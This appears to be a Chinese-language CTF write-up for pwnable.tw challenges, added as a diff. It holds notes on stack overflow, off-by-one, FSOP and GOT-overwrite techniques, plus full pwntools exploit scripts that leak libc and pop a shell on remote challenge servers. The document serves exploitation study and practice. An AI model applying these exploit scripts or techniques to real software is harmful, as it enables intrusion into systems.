@@ -1,0 +1,304 @@
+---
+title: pwnable.tw writeup 
+tags: 
+author: 
+top: 
+---
+
+
+## 由于前几题wp丢失就不详细写了
+1. 前两题都是shellcode
+
+## calc ???????????? 待解决
+
+
+## 3x17
+> 一道串gadget的题
+> 但是比较尴尬的是, 没能找到合适的gadget, 还是看了别人的exp才找到的.
+
+### 解题思路
+> 有三个地方可以实现 call ret, 但是因为无法控制栈的数据, 只有一个可以造成无限次写
+
+### 解题流程
+1. 找到合适的call gadget, 造成无限次写
+2. 栈转移
+
+## dubbsort
+> 栈溢出
+> 数字大小排序题
+
+### trick
+1. scanf函数很特别, 例如scanf('%d',&int_data), 如果输入的是 '+' 等特殊符号, 那么scanf函数什么也不干, 但是也不抛出异常, 这个可以用来避免覆盖canary
+2. canary的值一般小于 eip 与 libc 里面的值.
+
+### hacknote
+1. 有限制的: doublefree
+2. 覆盖函数指针, 但这里不能用onegadget, 貌似32位程序一般都不行
+
+### trick
+1. 函数参数阶段, 如 system("123456||/bin/sh\x00")也可以getshell
+
+
+## silver_bullet ?????? 待解决, strncat 的问题
+### 漏洞
+1. off by one
+
+![enter description here](https://www.github.com/Byzero512/blog_img/raw/master/1552489474365.png)
+
+
+### 利用
+> 栈溢出 rop
+
+### exp
+```python
+#!/usr/bin/env python
+from pwn import *
+# p=process('./silver_bullet',env={'LD_PRELOAD':'./libc_32.so.6'})
+p=remote('chall.pwnable.tw',10103)
+context.log_level='debug'
+
+ru=lambda s:p.recvuntil(s)
+sl=lambda s:p.sendline(s)
+sla=lambda a,b:p.sendlineafter(a,b)
+sd=lambda s:p.send(s)
+def menu(i):
+    ru('Your choice :')
+    sl(str(i))
+
+def create(payload):
+    menu(1)
+    ru('Give me your description of bullet :')
+    sd(payload)
+
+def power_up(payload):
+    menu(2)
+    ru('Give me your another description of bullet :')
+    sd(payload)
+
+def beat():
+    menu(3)
+
+create('a'*0x2f+'\n')
+e=ELF('./silver_bullet')
+power_up('a')
+
+payload='a'*3+'a'*4+p32(e.plt['puts'])
+payload+=p32(0x08048954)+p32(e.got['puts'])
+# gdb.attach(p,'nb 080488DD\nnb 080488FB')
+power_up(payload)
+
+beat()
+ru('++++++++++++')
+beat()
+line=ru('+++++++++++++++++++++++++++')
+
+
+libc_addr=line[(line.find('Oh ! You win !!\n')+len('Oh ! You win !!\n')):]
+libc_addr=u32(libc_addr[0:4])
+print(hex(libc_addr))
+pause()
+libc_base=libc_addr-0x5f140
+libc=ELF('./silver_bullet')
+one_off=0x3a819
+# one_off=0x5f065
+# one_off=0x5f066
+one=libc_base+one_off
+
+create('a'*0x2f+'\n')
+e=ELF('./silver_bullet')
+power_up('a')
+payload='a'*3+'a'*4+p32(one)
+payload+=p32(0x08048954)+p32(e.got['puts'])
+power_up(payload)
+
+beat()
+beat()
+ru('Oh ! You win !!')
+p.interactive()
+```
+
+## applestore
+
+### 漏洞分析: 变量声明没有初始化
+1. 其实程序逻辑没问题,也没有漏洞, 漏洞是因为变量残留在栈上, 但是声明时没有初始化, 导致可以实现一个类似于没有检查的unlink攻击
+
+### trick
+1. 我们想到stack privot的时候, 一般是将栈转移到bss, 但还有一种利用: 在32位程序函数参数是通过ebp寻址的, 那么我们stack privot的时候只控制ebp就可以实现对函数参数的控制.
+2. system函数参数阶段
+
+### 利用过程
+1. 想办法获得 Iphone 8, 这个结构体就是漏洞所在.
+2. 之后我们就可以控制 Iphone 8, 也就是可以可以控制栈
+3. 使用这个结构体 leak libc
+4. 之后通过 libc 中的_environ 来 leak stack
+5. delete的时候想办法控制栈中储存的old_ebp, 使其指向got中 atoi 附近
+6. 函数返回, 输入的时候控制 atoi 指向 system
+7. 之后调用atoi的时候,函数参数截断即可 getshell
+
+### exp
+```python
+#!/usr/bin/env python
+
+from pwn import *   
+
+debug=0
+if debug:
+    p=process(argv=['./applestore'],env={'LD_PRELOAD':'./libc_32.so.6'})
+else:
+    p=remote('chall.pwnable.tw',10104)
+context.log_level='debug'
+e=ELF('./applestore')
+puts_got=e.got['puts']
+def ru(s):
+    p.recvuntil(s)
+
+def sd(s):
+    p.recvuntil(s)
+
+def sl(s):
+    p.sendline(s)
+
+def add(index,payload=''):
+    ru('> ')
+    sl('2')
+    ru('> ')
+    if payload=='':
+        sl(str(index))
+    else:
+        sl(str(index)+'\x00'+payload)
+
+def delete(index,payload=''):
+    ru('> ')
+    sl('3')
+    ru('> ')
+    if payload=='':
+        sl(str(index))
+    else:
+        sl(str(index)+payload)         
+
+def show(payload=''):
+    ru('> ')
+    sl('4')
+    ru('> ')
+    if payload=='':
+        sl('y')
+    else:
+        sl('y\x00'+payload)
+def checkout():
+    ru('> ')
+    sl('5')
+    ru('> ')
+    sl('y')
+
+
+for  i in range(20):
+    add(2)
+
+for i in range(6):
+    add(1)
+
+
+checkout()
+
+#gdb.attach(p)    
+show(p32(puts_got)+p32(1)+p32(0))
+ru('27: ')
+puts_libc=u32(p.recvline()[0:4])
+
+system_off=0x3a940
+puts_off=0x5f140
+libc_base=puts_libc-puts_off
+system=libc_base+system_off
+environ=libc_base+0x001b1dbc
+
+show(p32(environ)+p32(1)+p32(0))
+ru('27: ')
+stack_ptr=u32(p.recvline()[0:4])
+print(hex(stack_ptr))
+
+
+bp=stack_ptr-0x104
+print(hex(bp))
+
+delete(27,p32(0)+p32(0)+p32(bp-0x4*3)+p32(0x0804B040+0x20))       
+
+ru('> ')
+p.sendline('12'+p32(system)+'||'+'/bin/sh\x00')
+
+p.interactive()
+```
+
+## seethefile
+> 一个简单的fsop, 调用fclose会使用一些函数hook
+
+### 利用过程
+> 设置好 lock_ptr, vtable_ptr, 函数hook, 以及绕过一些check即可
+
+
+### exp
+```python
+#!/usr/bin/env python 
+from mypwn import *
+context(log_level='debug',arch='i386')
+
+# p=process('./seethefile',env={'LD_PRELOAD':'./libc_32.so.6'})
+p=remote('chall.pwnable.tw',10200)
+libc=ELF('./libc_32.so.6')
+
+ru=lambda s:p.recvuntil(s)
+sl=lambda s:p.sendline(s)
+sd=lambda s:p.send(s)
+
+def menu(i):
+    ru('Your choice :')
+    sl(str(i))
+
+def open(file_name):
+    menu(1)
+    ru('What do you want to see :')
+    sl(file_name)
+
+def read():
+    menu(2)
+
+def write():
+    menu(3)
+
+def close():
+    menu(4)
+
+open('/proc/self/maps')
+read()
+read()
+write()
+libc_content=ru('1. Open').split('\n')
+libc_base=''
+for i in range(len(libc_content)):
+    if 'libc' in libc_content[i]:
+        libc_base=libc_content[i]
+        break
+libc_base=int(libc_base[0:8],16)
+print(hex(libc_base))
+libc.address=libc_base
+one_off=0x3a819
+one_off=0x5f065
+one_off=0x5f066
+one=libc_base+one_off
+
+one=libc.symbols['system']
+
+iofile_addr=0x0804B260
+payload=fsop_payload(iofile_addr,{'close':one},addr_payload={0x0804B280:p32(iofile_addr)})
+# gdb.attach(p,'nb 08048AE0\nnb 08048B0F')
+
+def leave(name):
+    menu(5)
+    ru('Leave your name :')
+    sl(name)
+leave(payload)
+
+p.interactive()
+```
+
+
+
